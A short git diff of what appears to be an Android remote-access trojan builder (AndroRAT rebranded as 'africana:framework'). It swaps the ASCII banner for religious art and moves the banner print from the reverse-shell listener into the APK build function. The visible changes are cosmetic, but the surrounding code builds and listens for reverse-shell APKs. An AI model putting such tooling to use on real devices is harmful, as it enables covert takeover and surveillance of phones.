@@ -19,16 +19,22 @@ import queue
 sys.stdout.reconfigure(encoding='utf-8')
 
 banner = """\033[1m\033[91m
-                    _           _____         _______
-    /\             | |         |  __ \     /\|__   __|
-   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
-  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
- / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
-/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|
-
-                                       \033[93m- By karma9874
+                   _/﹋\_
+                   (҂`_´)
+                  <,︻╦╤─ ҉- [ John 3:16  ]
+                   _/﹋\_                ]
+                  [ Jesus Christ said;   ]
+                  [ Defeat the devil by  ]
+                  [ fasting and praying. ]
+\033[93m
+                     africana:framework
+\033[32m
+         ~>[ Salvation is free. Get it for free. ]<~
+          __                 _____ _____     _     _
+       __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
+      |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
+      |_____|___|___|___|___|_____|__|__|_| |_|___|_|
 """
-
 pattern = '\"(\\d+\\.\\d+).*\"'
 
 def stdOutput(type_=None):
@@ -304,7 +310,6 @@ def get_shell(ip,port):
         print(stdOutput("error")+"\033[1m %s"%e);exit()
 
     soc.listen(2)
-    print(banner)
     while True:
         que = queue.Queue()
         t = threading.Thread(target=connection_checker,args=[soc,que])
@@ -354,6 +359,7 @@ def connection_checker(socket,queue):
 
 
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
+    print(banner)
     editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     try:
         file = open(editor,"r").readlines()
